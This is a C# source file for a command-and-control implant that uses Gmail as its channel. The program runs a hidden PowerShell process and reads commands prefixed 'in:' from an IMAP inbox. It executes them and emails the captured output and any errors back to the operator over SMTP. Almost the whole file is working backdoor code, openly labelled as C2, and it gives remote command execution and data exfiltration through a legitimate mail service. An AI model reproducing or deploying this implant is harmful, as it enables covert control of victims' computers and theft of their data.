using System;
using System.Threading;     // For using wait()
using System.Net;           // For NetworkCredentials
using System.Net.Mail;      // For mail operation
using System.Reflection;    // For loading .NET assembly in-memory
//using System.IO;            // For streamwriter
using System.Text;          // For string operation
//using System.Text.RegularExpressions; // For regular expression
using System.Diagnostics;   // For process operation
using System.Collections.Generic; // For List usage
//using System.Threading;         // For threading implementation
using EAGetMail;            // For Reading Gmail inboxes
//using System.Management.Automation;
//using System.Management.Automation.Runspaces;

namespace Gmail
{
    class Program
    {
        // ============ Command and Control through Gmail =============================

        static string smtpAddress = "smtp.gmail.com";
        static int SendPortNumber = 587;
        static bool enableSSL = true;

        static string imapAddress = "imap.gmail.com";

        static string emailFromAddress = "Operator@gmail.com"; //Change to Sender Email Address  
        static string password = "password";           		//Change to Sender Password  
        static string emailToAddress = "receiver@gmail.com"; //Change to Receiver Email Address

        static string subject = "Data from Client:";

        // Global Variables
        public static string strConcat = "";
        public static string body = "";
        public static int Flag = 1;

        // Change If needed
        public static int wait = 5;

        public static void SendEmail(string info)
        {
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new System.Net.Mail.MailAddress(emailFromAddress);
                mail.To.Add(emailToAddress);
                mail.Subject = subject;
                mail.Body = info;
                mail.IsBodyHtml = true;

                using (SmtpClient smtp = new SmtpClient(smtpAddress, SendPortNumber))
                {
                    smtp.Credentials = new NetworkCredential(emailFromAddress, password);
                    smtp.EnableSsl = enableSSL;
                    smtp.Send(mail);
                }
            }
        }

        // Read last Email from a list of all Emails in the Inbox
        public static String[] ReadLastEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
        {
            oClient.Connect(oServer);

            // retrieve unread/new email only
            oClient.GetMailInfosParam.Reset();
            oClient.GetMailInfosParam.GetMailInfosOptions = GetMailInfosOptionType.NewOnly;

            MailInfo[] infos = oClient.GetMailInfos();

            // Only the last (recent/latest) Email
            for (int i = infos.Length - 1; i > infos.Length - 2; i--)
            {
                MailInfo info = infos[i];

                Mail oMail = oClient.GetMail(info);

                if (((oMail.TextBody.ToString()).Substring(0, 3)).Equals("in:"))
                {
                    list_emails.Add(oMail.TextBody);
                    list_emails.Add("\nSubject of Mail Sent by Operator: " + oMail.Subject);

                    //Console.WriteLine("[*] Text Body: {0}", oMail.TextBody);

                    // mark unread email as read, next time this email won't be retrieved again
                    if (!info.Read)
                    {
                        oClient.MarkAsRead(info, true);
                    }
                    //New Mail Exists
                    Flag = 0;
                }
                else
                {
                    // Just sending string: "None" to get away from causing "System.ArgumentOutOfRangeException" when string.Substring is used to parse string.
                    list_emails.Add("None");
                }
            }
            String[] OrderFromC2 = list_emails.ToArray();
            return OrderFromC2;
        }

        public static String[] ReadEmail()
        {
            List<string> list_all_emails = new List<string>();

            MailServer oServer = new MailServer(imapAddress, emailToAddress, password, ServerProtocol.Imap4);

            // Enabling SSL Connection
            oServer.SSLConnection = true;
            oServer.Port = 993;

            MailClient oClient = new MailClient("TryIt");

            String[] Last_OrderFromC2_all_emails = ReadLastEmail(oClient, oServer, list_all_emails);

            return Last_OrderFromC2_all_emails;
        }

        public static void GmailC2Prompt(string command)
        {
            Console.WriteLine("\n[GmailC2] Command Sent> {0}\n", command);
        }

        public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                strOutput.Append(outLine.Data);

                strConcat += strOutput.ToString() + "<br />";
            }
        }

        public static void WaitForCommand(int sec)
        {
            while (sec >= 0)
            {
                Console.WriteLine("[*] Waiting for {0} seconds for the Operator to send Command", sec);
                Thread.Sleep(sec * 1000);
                sec--;
            }
        }

        static void Main()
        {
            //Console.WriteLine("\n[*] Starting 1\n");
            StringBuilder strInput = new StringBuilder();

            // Opening New Powershell session
            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();

            p.BeginOutputReadLine();

            //Console.WriteLine("\n[*] Entering While Loop...\n");
            while (true)
            {
                try
                {
                    Console.WriteLine("\n[*] Reading MAil Inbox\n");
                    string[] OrderFromC2 = ReadEmail();
                    
                    // Flag= 0 => New Mail Arrived
                    if (Flag == 0)
                    {

                        body = (OrderFromC2[0].ToLower()).Trim();

                        if ((body.Substring(0, 3)).Equals("in:"))
                        {
                            // Removing Indicator string from input cmd
                            string cmd = body.Substring(3, (body.Length - 3));

                            GmailC2Prompt(cmd);

                            if (cmd.Equals("exit"))
                            {
                                Environment.Exit(0);
                            }
                            else
                            {
                                strInput.Append(cmd);

                                //Console.WriteLine("p.StandardInput.WriteLine(strInput)");
                                p.StandardInput.WriteLine(strInput);
                                //Console.WriteLine("strInput.Remove(0, strInput.Length)");
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                        else if (!(body.Substring(0, 3)).Equals("in:"))
                        {
                            SendEmail(strConcat);   
                            // Updating Global Variables for next command input
                            Flag = 1;
                            strConcat = "";
                        }
                    }
                    else if(Flag == 1)
                    {
                        //will sleep for "wait" secs...
                        //Console.WriteLine("Within Else if(Flag == 1)");
                        WaitForCommand(wait);
                    }
                }
                // For MailServerException
                catch (MailServerException ex)
                {
                    //Console.WriteLine("within catch");
                    SendEmail("[!] Error caused: "+ex.ToString());
                }
            }
        }
    }
}
